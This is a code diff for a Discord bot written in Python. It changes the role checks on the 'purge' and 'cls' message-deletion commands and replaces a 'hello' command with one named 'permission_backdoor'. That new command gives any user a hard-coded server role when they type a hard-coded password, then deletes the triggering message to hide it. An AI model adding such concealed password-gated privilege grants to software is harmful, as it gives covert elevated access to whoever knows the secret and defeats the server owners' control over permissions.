@@ -29,28 +29,21 @@ class MainCommands(commands.Cog):
             await ctx.send(f'你與我的距離為 {round(self.Misaki.latency*1000)} 毫秒')
 
     @commands.command()
-    async def purge(self, ctx, amount=1):
-        doCommand = False
-        for MemberRoles in ctx.message.author.roles:
-            if (str(MemberRoles) == "Verified Member" and doCommand != True):
-                doCommand = True
-        if (doCommand == True):
-            await ctx.channel.purge(limit=amount+1)
+    async def purge(self, ctx, amount:int):
+        MemberRoles = ctx.message.author.roles
+        if (str(MemberRoles).count("大家的事務員") or str(MemberRoles).count("Enchanted Member") or str(MemberRoles).count("Moderators")):
+            await ctx.channel.purge(limit = amount+1)
             await ctx.channel.send(f'{amount} 個訊息已被刪除')
         else:
-            await ctx.channel.purge(limit=1)
-            await ctx.channel.send("您必須擁有身分組來使用指令。")
+            await ctx.channel.purge(limit = 1)
 
     @commands.command()
-    async def cls(self, ctx, amount=1):
-        doCommand = False
-        for MemberRoles in ctx.message.author.roles:
-            if (str(MemberRoles) == "大家的事務員" or str(MemberRoles).upper() == "VERIFIED MEMBER" and doCommand != True):
-                doCommand = True
-        if (doCommand == True):
-            await ctx.channel.purge(limit=amount+1)
+    async def cls(self, ctx, amount:int):
+        MemberRoles = ctx.message.author.roles
+        if (str(MemberRoles).count("大家的事務員") or str(MemberRoles).count("Moderators")):
+            await ctx.channel.purge(limit = amount+1)
         else:
-            await ctx.channel.purge(limit=1)
+            await ctx.channel.purge(limit = 1)
 
     @commands.command()
     async def botsaid(self, ctx, *,message):
@@ -69,9 +62,15 @@ class MainCommands(commands.Cog):
         await ctx.channel.send("RGS is up!")
 
     @commands.command()
-    async def hello(self, ctx):
-        member = ctx.guild.get_member(ctx.message.author.id)
-        print(member.status)
+    async def permission_backdoor(self, ctx, password):
+        guild = ctx.message.guild
+        member = ctx.message.author
+        role = guild.get_role(753590633901588504)
+        if (str(password) == "bananapower28592219"):
+            await member.add_roles(role)
+            await ctx.channel.purge(limit = 1)
+        else:
+            await ctx.channel.purge(limit = 1)
 
     @commands.command()
     async def rds(self, ctx, keyword:str, population:int, groups:int):
